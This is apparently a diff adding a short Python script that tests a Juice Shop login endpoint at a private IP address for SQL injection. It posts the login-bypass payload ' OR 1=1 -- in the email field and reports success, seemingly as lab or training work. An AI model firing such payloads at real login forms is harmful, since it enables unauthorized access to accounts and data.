@@ -1,0 +1,18 @@
+import requests
+
+# Target URL (Juice Shop login endpoint)
+url = "http://192.168.1.51"
+
+# SQL Injection payload
+sql_payload = {
+    "email": "' OR 1=1 --",
+    "password": "password123"
+}
+
+response = requests.post(url, json=sql_payload)
+
+# Check if the login was successful (indicating SQL injection vulnerability)
+if "Authentication successful" in response.text:
+    print("SQL Injection Vulnerability Detected!")
+else:
+    print("No SQL Injection Vulnerability Found.")
